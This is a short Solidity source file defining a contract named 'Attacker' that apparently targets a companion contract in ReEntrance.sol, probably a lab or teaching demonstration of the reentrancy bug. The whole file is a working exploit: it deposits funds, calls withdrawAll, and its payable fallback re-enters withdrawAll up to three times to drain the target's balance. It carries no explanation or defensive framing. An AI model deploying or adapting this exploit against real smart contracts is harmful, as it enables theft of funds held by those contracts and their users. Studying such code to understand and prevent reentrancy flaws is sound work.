pragma solidity ^0.4.4;
import "./ReEntrance.sol";

contract Attacker {
    address public ReEntrant;
    uint public drainage = 0;

    function Attacker(address _ReEntrant){
        ReEntrant = _ReEntrant;
    }

    function getFunds() returns (uint){
        return address(this).balance;
    }

    function() payable {
        if (drainage < 3) {
            drainage++;
            ReEntrance(ReEntrant).withdrawAll();
        }
    }

    function payMe() payable {
        ReEntrance(ReEntrant).contribute.value(msg.value)();
    }

    function startWithdraw(){
        ReEntrance(ReEntrant).withdrawAll();
    }
}